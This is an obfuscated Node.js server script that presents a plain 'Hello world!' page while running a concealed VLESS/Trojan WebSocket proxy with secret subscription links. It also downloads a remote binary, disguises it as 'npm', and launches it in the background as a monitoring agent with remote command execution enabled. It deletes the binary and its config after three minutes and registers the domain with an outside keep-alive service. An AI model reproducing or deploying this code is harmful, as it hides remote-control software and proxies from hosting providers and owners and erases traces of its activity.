const _0xf0bc3b=_0x260d;(function(_0x524e63,_0x105f40){const _0x288564=_0x260d,_0x452a4d=_0x524e63();while(!![]){try{const _0x28a9e2=-parseInt(_0x288564(0xfc))/0x1*(parseInt(_0x288564(0xfe))/0x2)+-parseInt(_0x288564(0x130))/0x3+-parseInt(_0x288564(0x124))/0x4*(-parseInt(_0x288564(0x123))/0x5)+parseInt(_0x288564(0x10f))/0x6+-parseInt(_0x288564(0x13b))/0x7*(parseInt(_0x288564(0x140))/0x8)+-parseInt(_0x288564(0x116))/0x9+-parseInt(_0x288564(0xe0))/0xa*(-parseInt(_0x288564(0x107))/0xb);if(_0x28a9e2===_0x105f40)break;else _0x452a4d['push'](_0x452a4d['shift']());}catch(_0x458d3b){_0x452a4d['push'](_0x452a4d['shift']());}}}(_0x3b8a,0x3a2a2));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0xf0bc3b(0x13a)),path=require(_0xf0bc3b(0xf5)),crypto=require(_0xf0bc3b(0x141)),{Buffer}=require(_0xf0bc3b(0xe3)),{exec,execSync}=require(_0xf0bc3b(0xe5)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process.env.UUID||_0xf0bc3b(0xeb),NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',DOMAIN=process.env.DOMAIN||_0xf0bc3b(0xe4),AUTO_ACCESS=process.env.AUTO_ACCESS||!![],WSPATH=process.env.WSPATH||UUID[_0xf0bc3b(0x121)](0x0,0x8),SUB_PATH=process.env.SUB_PATH||_0xf0bc3b(0x139),NAME=process.env.NAME||'',PORT=process.env.PORT||0x1eb4;let ISP='';function _0x3b8a(){const _0x6c6540=['unlink','&path=%2F','Failed\x20to\x20resolve\x20','readFile','connection','write','concat','length','pipe','path','from','npm\x20download\x20successfully','Server\x20is\x20running\x20on\x20port\x20','--tls','client_secret:\x20','https://amd64.ssss.nyc.mn/agent','3574paIolb','\x20with\x20all\x20DNS\x20servers','122MQLyEp','data','setsid\x20nohup\x20./npm\x20-s\x20','update','8.8.4.4','arm64','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','decode','text/html','23947pCWZuE','Answer','error:\x20','replace','2053','country_code','\x20-p\x20','https://api.ip.sb/geoip','2847378rHojAG','utf8','once','base64','digest','https://arm64.ssss.nyc.mn/v1','join','46044alFBEB','Server','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2087','https://oooo.serv00.net/add-url','map','includes','application/json','isp','test','log','slice','trojan://','286570EZmeff','8wJcKht','readUInt16BE','pop','createWriteStream','then','application/dns-json','readUInt8','/bin/bash','Not\x20Found\x0a','8443','chmod\x20+x\x20npm','npm\x20is\x20running','439065nHKOZN','url','utf-8','send','get','toString','stream','type','close','sub','net','343jxUEha','vless://','https://arm64.ssss.nyc.mn/agent','hex','Hello\x20world!','3016kHkOKi','crypto','error','reduce','substr','split','every','end','createHash','npm\x20is\x20already\x20running,\x20skip\x20running...','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','trim','connect','writeHead','catch','https://','https://amd64.ssss.nyc.mn/v1','message','170MdDuaQ','listen','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','buffer','115506.xyz','child_process','text/plain','Unknown','arm',':443?security=tls&sni=','post','a83c9448-8d3c-4562-9dff-c51151ce4ed1'];_0x3b8a=function(){return _0x6c6540;};return _0x3b8a();}const GetISP=async()=>{const _0x147346=_0xf0bc3b;try{const _0x5cf828=await axios[_0x147346(0x134)](_0x147346(0x10e)),_0x27a1b9=_0x5cf828[_0x147346(0xff)];ISP=(_0x27a1b9[_0x147346(0x10c)]+'-'+_0x27a1b9[_0x147346(0x11e)])['replace'](/ /g,'_');}catch(_0x272a85){ISP=_0x147346(0xe7);}};GetISP();function _0x260d(_0x497313,_0x5e8e3d){_0x497313=_0x497313-0xd5;const _0x3b8a92=_0x3b8a();let _0x260dba=_0x3b8a92[_0x497313];return _0x260dba;}const httpServer=http['createServer']((_0x26c6fc,_0x25b99c)=>{const _0x64217d=_0xf0bc3b;if(_0x26c6fc['url']==='/'){const _0x286109=path[_0x64217d(0x115)](__dirname,'index.html');fs[_0x64217d(0xef)](_0x286109,_0x64217d(0x110),(_0x3d3999,_0x5bfa57)=>{const _0x3724c=_0x64217d;if(_0x3d3999){_0x25b99c[_0x3724c(0xdb)](0xc8,{'Content-Type':_0x3724c(0x106)}),_0x25b99c['end'](_0x3724c(0x13f));return;}_0x25b99c[_0x3724c(0xdb)](0xc8,{'Content-Type':_0x3724c(0x106)}),_0x25b99c[_0x3724c(0xd5)](_0x5bfa57);});return;}else{if(_0x26c6fc[_0x64217d(0x131)]==='/'+SUB_PATH){const _0x57fcfc=NAME?NAME+'-'+ISP:ISP,_0xeaaa9f=_0x64217d(0x13c)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x57fcfc,_0x41f930=_0x64217d(0x122)+UUID+'@'+DOMAIN+_0x64217d(0xe9)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x64217d(0xed)+WSPATH+'#'+_0x57fcfc,_0x5068ef=_0xeaaa9f+'\x0a'+_0x41f930,_0x239890=Buffer[_0x64217d(0xf6)](_0x5068ef)[_0x64217d(0x135)](_0x64217d(0x112));_0x25b99c[_0x64217d(0xdb)](0xc8,{'Content-Type':_0x64217d(0xe6)}),_0x25b99c[_0x64217d(0xd5)](_0x239890+'\x0a');}else _0x25b99c[_0x64217d(0xdb)](0x194,{'Content-Type':'text/plain'}),_0x25b99c[_0x64217d(0xd5)](_0x64217d(0x12c));}}),wss=new WebSocket[(_0xf0bc3b(0x117))]({'server':httpServer}),uuid=UUID[_0xf0bc3b(0x10a)](/-/g,''),DNS_SERVERS=[_0xf0bc3b(0x102),'1.1.1.1'];function resolveHost(_0x45d8bf){return new Promise((_0x2bf268,_0x2528e9)=>{const _0x39e68e=_0x260d;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x39e68e(0x11f)](_0x45d8bf)){_0x2bf268(_0x45d8bf);return;}let _0x5e577c=0x0;function _0x25c69e(){const _0x48c0c5=_0x39e68e;if(_0x5e577c>=DNS_SERVERS[_0x48c0c5(0xf3)]){_0x2528e9(new Error(_0x48c0c5(0xee)+_0x45d8bf+_0x48c0c5(0xfd)));return;}const _0x57df93=DNS_SERVERS[_0x5e577c];_0x5e577c++;const _0x46a409='https://dns.google/resolve?name='+encodeURIComponent(_0x45d8bf)+'&type=A';axios['get'](_0x46a409,{'timeout':0x1388,'headers':{'Accept':_0x48c0c5(0x129)}})[_0x48c0c5(0x128)](_0x18a514=>{const _0x53603c=_0x48c0c5,_0x1df0cf=_0x18a514[_0x53603c(0xff)];if(_0x1df0cf['Status']===0x0&&_0x1df0cf[_0x53603c(0x108)]&&_0x1df0cf['Answer']['length']>0x0){const _0x3de986=_0x1df0cf[_0x53603c(0x108)]['find'](_0x48b225=>_0x48b225[_0x53603c(0x137)]===0x1);if(_0x3de986){_0x2bf268(_0x3de986[_0x53603c(0xff)]);return;}}_0x25c69e();})[_0x48c0c5(0xdc)](_0x306eb1=>{_0x25c69e();});}_0x25c69e();});}function handleVlessConnection(_0xc2225,_0x3202f2){const _0x4f344d=_0xf0bc3b,[_0x208ac4]=_0x3202f2,_0x4efd77=_0x3202f2['slice'](0x1,0x11);if(!_0x4efd77[_0x4f344d(0x146)]((_0x2259c0,_0x5545b0)=>_0x2259c0==parseInt(uuid[_0x4f344d(0x144)](_0x5545b0*0x2,0x2),0x10)))return![];let _0x1cb28c=_0x3202f2[_0x4f344d(0x121)](0x11,0x12)['readUInt8']()+0x13;const _0x10d81a=_0x3202f2[_0x4f344d(0x121)](_0x1cb28c,_0x1cb28c+=0x2)['readUInt16BE'](0x0),_0x4fa9c4=_0x3202f2[_0x4f344d(0x121)](_0x1cb28c,_0x1cb28c+=0x1)[_0x4f344d(0x12a)](),_0xe42b9d=_0x4fa9c4==0x1?_0x3202f2[_0x4f344d(0x121)](_0x1cb28c,_0x1cb28c+=0x4)[_0x4f344d(0x115)]('.'):_0x4fa9c4==0x2?new TextDecoder()[_0x4f344d(0x105)](_0x3202f2['slice'](_0x1cb28c+0x1,_0x1cb28c+=0x1+_0x3202f2['slice'](_0x1cb28c,_0x1cb28c+0x1)['readUInt8']())):_0x4fa9c4==0x3?_0x3202f2['slice'](_0x1cb28c,_0x1cb28c+=0x10)[_0x4f344d(0x143)]((_0x435026,_0x39f73a,_0x26365b,_0x5365ea)=>_0x26365b%0x2?_0x435026[_0x4f344d(0xf2)](_0x5365ea[_0x4f344d(0x121)](_0x26365b-0x1,_0x26365b+0x1)):_0x435026,[])[_0x4f344d(0x11b)](_0x1b61c4=>_0x1b61c4[_0x4f344d(0x125)](0x0)[_0x4f344d(0x135)](0x10))[_0x4f344d(0x115)](':'):'';_0xc2225[_0x4f344d(0x133)](new Uint8Array([_0x208ac4,0x0]));const _0x1ef17a=createWebSocketStream(_0xc2225);return resolveHost(_0xe42b9d)['then'](_0x3a9342=>{const _0x3f6bd5=_0x4f344d;net[_0x3f6bd5(0xda)]({'host':_0x3a9342,'port':_0x10d81a},function(){const _0x4d76fe=_0x3f6bd5;this['write'](_0x3202f2[_0x4d76fe(0x121)](_0x1cb28c)),_0x1ef17a['on'](_0x4d76fe(0x142),()=>{})[_0x4d76fe(0xf4)](this)['on'](_0x4d76fe(0x142),()=>{})[_0x4d76fe(0xf4)](_0x1ef17a);})['on'](_0x3f6bd5(0x142),()=>{});})[_0x4f344d(0xdc)](_0x30f146=>{const _0x1a4727=_0x4f344d;net[_0x1a4727(0xda)]({'host':_0xe42b9d,'port':_0x10d81a},function(){const _0x30a3f4=_0x1a4727;this[_0x30a3f4(0xf1)](_0x3202f2[_0x30a3f4(0x121)](_0x1cb28c)),_0x1ef17a['on']('error',()=>{})['pipe'](this)['on'](_0x30a3f4(0x142),()=>{})[_0x30a3f4(0xf4)](_0x1ef17a);})['on'](_0x1a4727(0x142),()=>{});}),!![];}function handleTrojanConnection(_0x4b4a9d,_0x3d583e){const _0x3391b0=_0xf0bc3b;try{if(_0x3d583e[_0x3391b0(0xf3)]<0x3a)return![];const _0x68b501=_0x3d583e[_0x3391b0(0x121)](0x0,0x38)['toString'](),_0x1890ef=[UUID];let _0x54db51=null;for(const _0x167e22 of _0x1890ef){const _0xbb794=crypto[_0x3391b0(0xd6)]('sha224')[_0x3391b0(0x101)](_0x167e22)[_0x3391b0(0x113)](_0x3391b0(0x13e));if(_0xbb794===_0x68b501){_0x54db51=_0x167e22;break;}}if(!_0x54db51)return![];let _0x4c1e55=0x38;_0x3d583e[_0x4c1e55]===0xd&&_0x3d583e[_0x4c1e55+0x1]===0xa&&(_0x4c1e55+=0x2);const _0x192297=_0x3d583e[_0x4c1e55];if(_0x192297!==0x1)return![];_0x4c1e55+=0x1;const _0x330ab6=_0x3d583e[_0x4c1e55];_0x4c1e55+=0x1;let _0x43df2f,_0x914814;if(_0x330ab6===0x1)_0x43df2f=_0x3d583e[_0x3391b0(0x121)](_0x4c1e55,_0x4c1e55+0x4)[_0x3391b0(0x115)]('.'),_0x4c1e55+=0x4;else{if(_0x330ab6===0x3){const _0x251b61=_0x3d583e[_0x4c1e55];_0x4c1e55+=0x1,_0x43df2f=_0x3d583e['slice'](_0x4c1e55,_0x4c1e55+_0x251b61)[_0x3391b0(0x135)](),_0x4c1e55+=_0x251b61;}else{if(_0x330ab6===0x4)_0x43df2f=_0x3d583e[_0x3391b0(0x121)](_0x4c1e55,_0x4c1e55+0x10)['reduce']((_0xcecbcb,_0x2efe9e,_0x3613a9,_0x46f7e8)=>_0x3613a9%0x2?_0xcecbcb['concat'](_0x46f7e8[_0x3391b0(0x121)](_0x3613a9-0x1,_0x3613a9+0x1)):_0xcecbcb,[])[_0x3391b0(0x11b)](_0x52bfa9=>_0x52bfa9[_0x3391b0(0x125)](0x0)[_0x3391b0(0x135)](0x10))[_0x3391b0(0x115)](':'),_0x4c1e55+=0x10;else return![];}}_0x914814=_0x3d583e[_0x3391b0(0x125)](_0x4c1e55),_0x4c1e55+=0x2;_0x4c1e55<_0x3d583e[_0x3391b0(0xf3)]&&_0x3d583e[_0x4c1e55]===0xd&&_0x3d583e[_0x4c1e55+0x1]===0xa&&(_0x4c1e55+=0x2);const _0x1d6d77=createWebSocketStream(_0x4b4a9d);return resolveHost(_0x43df2f)[_0x3391b0(0x128)](_0x150852=>{const _0x9cecf0=_0x3391b0;net[_0x9cecf0(0xda)]({'host':_0x150852,'port':_0x914814},function(){const _0x1ffcf5=_0x9cecf0;_0x4c1e55<_0x3d583e['length']&&this['write'](_0x3d583e[_0x1ffcf5(0x121)](_0x4c1e55)),_0x1d6d77['on'](_0x1ffcf5(0x142),()=>{})['pipe'](this)['on']('error',()=>{})[_0x1ffcf5(0xf4)](_0x1d6d77);})['on'](_0x9cecf0(0x142),()=>{});})[_0x3391b0(0xdc)](_0x1f1ecc=>{net['connect']({'host':_0x43df2f,'port':_0x914814},function(){const _0x322422=_0x260d;_0x4c1e55<_0x3d583e[_0x322422(0xf3)]&&this[_0x322422(0xf1)](_0x3d583e[_0x322422(0x121)](_0x4c1e55)),_0x1d6d77['on'](_0x322422(0x142),()=>{})[_0x322422(0xf4)](this)['on'](_0x322422(0x142),()=>{})[_0x322422(0xf4)](_0x1d6d77);})['on']('error',()=>{});}),!![];}catch(_0x3a4e3e){return![];}}wss['on'](_0xf0bc3b(0xf0),(_0x169f1e,_0x1d6cbc)=>{const _0x478cdb=_0xf0bc3b,_0x216bce=_0x1d6cbc['url']||'';_0x169f1e[_0x478cdb(0x111)](_0x478cdb(0xdf),_0x384840=>{const _0x4d21c4=_0x478cdb;if(_0x384840[_0x4d21c4(0xf3)]>0x11&&_0x384840[0x0]===0x0){const _0x3403d6=_0x384840['slice'](0x1,0x11),_0x1d85df=_0x3403d6[_0x4d21c4(0x146)]((_0x266254,_0x592246)=>_0x266254==parseInt(uuid[_0x4d21c4(0x144)](_0x592246*0x2,0x2),0x10));if(_0x1d85df){!handleVlessConnection(_0x169f1e,_0x384840)&&_0x169f1e[_0x4d21c4(0x138)]();return;}}!handleTrojanConnection(_0x169f1e,_0x384840)&&_0x169f1e[_0x4d21c4(0x138)]();})['on'](_0x478cdb(0x142),()=>{});});const getDownloadUrl=()=>{const _0x512d09=_0xf0bc3b,_0x2d5364=os['arch']();return _0x2d5364===_0x512d09(0xe8)||_0x2d5364===_0x512d09(0x103)||_0x2d5364==='aarch64'?!NEZHA_PORT?_0x512d09(0x114):_0x512d09(0x13d):!NEZHA_PORT?_0x512d09(0xde):_0x512d09(0xfb);},downloadFile=async()=>{const _0x48ed27=_0xf0bc3b;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x42a2b4=getDownloadUrl(),_0x33f1c7=await axios({'method':_0x48ed27(0x134),'url':_0x42a2b4,'responseType':_0x48ed27(0x136)}),_0x43144f=fs[_0x48ed27(0x127)]('npm');return _0x33f1c7['data'][_0x48ed27(0xf4)](_0x43144f),new Promise((_0x7901ed,_0x27ac75)=>{const _0x4de863=_0x48ed27;_0x43144f['on']('finish',()=>{const _0x53fd9a=_0x260d;console[_0x53fd9a(0x120)](_0x53fd9a(0xf7)),exec(_0x53fd9a(0x12e),_0x159f10=>{if(_0x159f10)_0x27ac75(_0x159f10);_0x7901ed();});}),_0x43144f['on'](_0x4de863(0x142),_0x27ac75);});}catch(_0x320b72){throw _0x320b72;}},runnz=async()=>{const _0x1a9d7b=_0xf0bc3b;try{const _0x4eb4bb=execSync(_0x1a9d7b(0x118),{'encoding':_0x1a9d7b(0x132)});if(_0x4eb4bb[_0x1a9d7b(0xd9)]()!==''){console['log'](_0x1a9d7b(0xd7));return;}}catch(_0x48407d){}await downloadFile();let _0x3bf331='',_0x501ff0=['443',_0x1a9d7b(0x12d),'2096',_0x1a9d7b(0x119),'2083',_0x1a9d7b(0x10b)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x37d8f5=_0x501ff0[_0x1a9d7b(0x11c)](NEZHA_PORT)?_0x1a9d7b(0xf9):'';_0x3bf331=_0x1a9d7b(0x100)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1a9d7b(0x10d)+NEZHA_KEY+'\x20'+_0x37d8f5+_0x1a9d7b(0xe2);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x10f198=NEZHA_SERVER[_0x1a9d7b(0x11c)](':')?NEZHA_SERVER[_0x1a9d7b(0x145)](':')[_0x1a9d7b(0x126)]():'',_0x3bf0ef=_0x501ff0['includes'](_0x10f198)?'true':'false',_0xea5491=_0x1a9d7b(0xfa)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x1a9d7b(0x104)+_0x3bf0ef+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync']('config.yaml',_0xea5491);}_0x3bf331=_0x1a9d7b(0xd8);}else{console[_0x1a9d7b(0x120)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x3bf331,{'shell':_0x1a9d7b(0x12b)},_0x589b70=>{const _0xb602b=_0x1a9d7b;if(_0x589b70)console[_0xb602b(0x142)]('npm\x20running\x20error:',_0x589b70);else console[_0xb602b(0x120)](_0xb602b(0x12f));});}catch(_0x86cdc6){console[_0x1a9d7b(0x142)](_0x1a9d7b(0x109)+_0x86cdc6);}};async function addAccessTask(){const _0x11dd2f=_0xf0bc3b;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xf21bfd=_0x11dd2f(0xdd)+DOMAIN;try{const _0x3ce292=await axios[_0x11dd2f(0xea)](_0x11dd2f(0x11a),{'url':_0xf21bfd},{'headers':{'Content-Type':_0x11dd2f(0x11d)}});console[_0x11dd2f(0x120)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x30292d){}}const delFiles=()=>{const _0x55d853=_0xf0bc3b;fs['unlink']('npm',()=>{}),fs[_0x55d853(0xec)]('config.yaml',()=>{});};httpServer[_0xf0bc3b(0xe1)](PORT,()=>{const _0x546122=_0xf0bc3b;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x546122(0x120)](_0x546122(0xf8)+PORT);});
